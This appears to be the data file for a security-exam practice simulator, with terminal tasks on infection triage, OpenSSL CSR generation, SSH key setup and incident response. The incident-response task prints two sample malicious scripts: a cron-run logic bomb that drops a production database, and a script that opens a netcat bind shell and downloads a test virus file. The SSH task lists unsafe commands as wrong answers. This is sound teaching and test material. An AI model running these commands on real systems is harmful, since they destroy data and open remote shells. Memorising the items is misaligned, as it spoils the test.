window.TERMINAL_LABS = {
  infection: {
    title:'Security Analyst Console',
    prompt:'analyst@secops:~$',
    intro:[
      'You are investigating a potential infection across two network segments.',
      'Type show to list the commands available in this PBQ.'
    ],
    show:[
      'show hosts              List all hosts in scope',
      'show firewall           Display firewall traffic records',
      'show 192.168.10.22      Display endpoint security log',
      'show 192.168.10.37      Display endpoint security log',
      'show 192.168.10.41      Display endpoint security log',
      'show 10.10.9.12         Display endpoint security log',
      'show 10.10.9.18         Display endpoint security log',
      'answer                  Open the classification panel',
      'clear                   Clear the terminal'
    ],
    commands:{
      'show hosts':`R&D Network\n  192.168.10.22\n  192.168.10.37\n  192.168.10.41\nEngineering Network\n  10.10.9.12\n  10.10.9.18`,
      'show firewall':`TIMESTAMP           SOURCE          DESTINATION      PORT  APP     ACTION\n4/17 16:01:44      10.10.9.18      57.203.54.183    443   ssl     permit\n4/17 16:01:58      192.168.10.37   57.203.54.221    443   ssl     permit\n4/17 16:17:06      192.168.10.22   10.10.9.12       135   rpc     permit\n4/17 16:27:36      192.168.10.41   10.10.9.12       445   smbv1   permit\n4/17 16:28:06      10.10.9.12      192.168.10.41    135   rpc     permit\n4/17 16:33:31      10.10.9.18      192.168.10.22    135   rpc     permit\n4/18 02:31:36      10.10.9.18      192.168.10.41    445   smbv2   permit\n4/18 13:37:36      192.168.10.22   10.10.9.18       445   smbv3   permit`,
      'show 192.168.10.22':`4/17 14:41 INFO Scan complete\n4/17 14:44 INFO Boot sector: clean\n4/18 02:31 WARN Scheduled scan disabled by process svh0st.exe\n4/18 02:32 WARN Scheduled update disabled by process svh0st.exe`,
      'show 192.168.10.37':`4/18 14:33 INFO Definition update complete\n4/18 14:37 WARN File svch0st.exe match definition v10.2.3.4440\n4/18 14:37 WARN File quarantined svch0st.exe\n4/18 14:43 INFO Files quarantined: 1`,
      'show 192.168.10.41':`4/18 14:34 ERROR Unable to reach update server\n4/18 14:37 WARN File svch0st.exe match heuristic pattern 0c09488c08d0f3k\n4/18 14:37 ERROR Unable to quarantine file svch0st.exe`,
      'show 10.10.9.12':`4/18 14:37 WARN File found svh0st.exe match definition v10.2.3.4440\n4/18 14:37 WARN File quarantined`,
      'show 10.10.9.18':`4/18 14:34 ERROR Unable to reach update server\n4/18 14:37 WARN File svh0st.exe match heuristic pattern 0c09488c08d0f3k\n4/18 14:37 ERROR Unable to quarantine svh0st.exe`
    },
    answer:{kind:'hostclass'}
  },
  openssl:{
    title:'Web Server Terminal',prompt:'webadmin@app01:~$',
    intro:['Create a 2048-bit RSA private key and certificate signing request (CSR).','Type show to see the commands available in this PBQ.'],
    show:['openssl req -new -newkey rsa:2048 -keyout /certificate/csr.key -out /certificate/example.com.csr','ls /certificate','answer','clear'],
    commands:{'ls /certificate':'csr.key  README.txt'},
    validate:(cmd,state)=>{
      const n=cmd.trim().replace(/\s+/g,' ');
      const ok=/^openssl req -new -newkey rsa:2048 -keyout \/certificate\/csr\.key -out \/certificate\/example\.com\.csr$/i.test(n);
      if(ok){state.done=true;return{ok:true,out:'Generating a RSA private key, 2048 bit long modulus\n................................+++++\n................................+++++\ne is 65537 (0x010001)\nCertificate signing request written to /certificate/example.com.csr'}}
      return null;
    },
    answer:{kind:'terminalDone',text:'Generate the CSR successfully in the terminal.'}
  },
  ssh:{
    title:'SSH Client',prompt:'student@client:~$',
    intro:['Set up passwordless authentication using the minimum set of commands, then verify the login.','Type show to list the commands available in this PBQ.'],
    show:['ssh-keygen -t rsa','ssh-copy-id -i ~/.ssh/id_rsa.pub user@server','ssh -i ~/.ssh/id_rsa user@server','chmod 644 ~/.ssh/id_rsa','chmod 777 ~/.ssh/authorized_keys','scp ~/.ssh/id_rsa user@server:.ssh/authorized_keys','ssh root@server','clear'],
    validate:(cmd,state)=>{
      const n=cmd.trim().replace(/\s+/g,' ');
      if(n==='ssh-keygen -t rsa'){
        if(state.keygen)return{ok:false,out:'Key pair already exists for this simulation.'};state.keygen=true;return{ok:true,out:'Generating public/private rsa key pair.\nYour identification has been saved in /home/student/.ssh/id_rsa\nYour public key has been saved in /home/student/.ssh/id_rsa.pub'};
      }
      if(n==='ssh-copy-id -i ~/.ssh/id_rsa.pub user@server'){
        if(!state.keygen)return{ok:false,out:'ERROR: No public key exists yet. Generate a key pair first.'};state.copied=true;return{ok:true,out:'Number of key(s) added: 1\nNow try logging into the machine, with: ssh user@server'};
      }
      if(n==='ssh -i ~/.ssh/id_rsa user@server'){
        if(!state.copied)return{ok:false,out:'user@server\'s password:  [passwordless authentication is not configured yet]'};state.done=true;return{ok:true,out:'Last login: today from client\nuser@server:~$\nPasswordless authentication verified.'};
      }
      if(['chmod 644 ~/.ssh/id_rsa','chmod 777 ~/.ssh/authorized_keys','scp ~/.ssh/id_rsa user@server:.ssh/authorized_keys','ssh root@server'].includes(n)){ state.unsafe=true; return{ok:false,out:'This command is unsafe or outside the required sequence. Reset this attempt to complete the minimum safe sequence.'}; }
      return null;
    },
    answer:{kind:'terminalDone',text:'Complete the minimum correct SSH sequence.'}
  },
  compromise:{
    title:'Incident Response Console',prompt:'ir@prod:~$',
    intro:['Analyze two suspicious scripts and classify each compromise type.','Type show to list the available commands.'],
    show:['show outputs','cat /var/log/www/file1.sh','cat /var/log/www/file2.sh','answer','clear'],
    commands:{
      'show outputs':'Suspicious artifacts: /var/log/www/file1.sh, /var/log/www/file2.sh',
      'cat /var/log/www/file1.sh':`#!/bin/bash\nuser=\`grep john /etc/passwd\`\nif [ $user = "" ]; then\n  mysql -u root -p mys3cr3tdbpw -e "drop database production"\nfi\n\n# crontab -l\n*/5 * * * * /var/log/www/file1.sh`,
      'cat /var/log/www/file2.sh':`#!/bin/bash\ndate=\`date +%Y-%m-%y\`\necho "type in your full name:"\nread loggedInName\nnc -l -p 31337 -e /bin/bash\nwget www.eicar.org/download/eicar.com.txt\necho "Hello, $loggedInName the virus file has been downloaded"`
    },
    answer:{kind:'compromise'}
  }
};
